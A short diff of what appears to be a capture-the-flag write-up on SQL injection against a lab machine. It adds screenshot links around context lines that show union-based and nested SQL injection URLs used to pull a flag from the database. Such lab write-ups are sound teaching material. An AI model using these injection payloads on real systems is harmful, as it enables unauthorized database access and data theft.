@@ -138,10 +138,14 @@ Trying the following commands gives us an idea of where to start.
 http://10.10.68.254/user?id=2 union all select 1,2,3 from users#
 ```
 
+![user sql injection](sqhell_user_injection.PNG)
+
 This shows that we were successfully able to overwrite the database. Let's nest another SQL injection inside it and try to retrieve the flag.
 
 ```
 http://10.10.68.254/user?id=2 union all select "1 union select 1,flag,3,4 from flag-- -",1,2 from users#
 ```
+
+![sql user flag](sql_user_flag_redacted.PNG)
 
 Success, we were finally able to retrieve the flag!
